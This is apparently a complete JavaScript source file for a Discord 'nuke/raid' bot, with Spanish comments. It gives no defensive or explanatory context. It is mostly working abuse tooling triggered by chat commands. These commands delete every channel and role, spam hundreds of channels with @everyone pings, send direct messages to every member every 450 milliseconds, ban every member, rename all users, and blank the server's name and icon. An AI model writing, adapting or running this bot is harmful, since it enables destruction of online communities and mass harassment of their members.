const Discord = require("discord.js");
const client = new Discord.Client();
 
client.on("ready", () => {
    console.log(`XDDDDD...`);
    console.log(`Cliente ${client.user.tag} Bruh!`);
    console.log("Creado por FliegerDer|XDD ");
    console.log(`Comandos:
  .banall
  .nuke
  .raid
  .foto
  .mdall
  .roles
  .deleterole
  .nick (nombre)
  .list`);
    presencia();  
    });
 
 
 
function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "Bruh",
  type: "PLAYING"
 
}
  });
}
 
//nuke
 
client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === '.nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`XDDD`, {
          type: 'text'
        }).then(channel => {
          channel.send("//colocar imagen//")
        })
         }
      })
 
//raid
 
client.on("message", message => {
            if (message.author.bot) return;
          
           if (message.content === '.raid') {
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`XDDDDDDD`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("@everyone ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ")
              channel.send("@everyone  ");
              channel.send("@everyone  ");
              channel.send("@everyone  ");
              channel.send("@everyone  ");
              channel.send("@everyone  ");
                  
              })
              }
              }
            });
          
//mdall
 
          client.on("message", message => {
                        if (message.author.bot) return;
                        
                      if(message.content === ".mdall")
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send(" ").catch(error => {});
                        },450);
                      })
                      });
 
//borar roles
 
client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === ('.deleterole')){
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });
 
//crear roles
 
client.on("message", message => {
                if (message.author.bot) return;
              
               if (message.content === '.roles') {
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: ``,color: '#d41818',},reason: 'razon',})
              };
               }
                });
 
//foto y nombre
 
client.on("message", message => {
                    if (message.author.bot) return;
                  
                   if (message.content === '.foto') {
                      message.guild.setName(" ");
                      message.guild.setIcon(" "
                      );
                      }
                    }); 
 
//banall
 
client.on("message", message => {
    if (message.author.bot) return;
  
    if (message.content === '.banall') {
    message.delete()
    message.guild.members.cache.forEach(m => {
    m.ban()
    });
  }
}); 
 
//cambiar nombres
 
client.on("message", msg => {
const args = msg.content.slice().trim().split(/ +/g );
const command = args.shift().toLowerCase();
  if (command === '.nick'){
      msg.delete()
    let nickname = args.join(" ");
    var i = 0;
    msg.guild.members.cache.forEach(member =>{
      i++
    }
      )
    msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
    msg.guild.members.cache.forEach(member =>{
 
      member.setNickname(nickname)
    })
    }
});
 
//lista de sv
 
client.on("message", message => {
    if (message.author.bot) return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (command === '.list') {
       message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle(message.guild.name)
       .setThumbnail()
       .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
       .setColor("RED");
       message.channel.send(embed)
   }
});
 
 client.login("token");
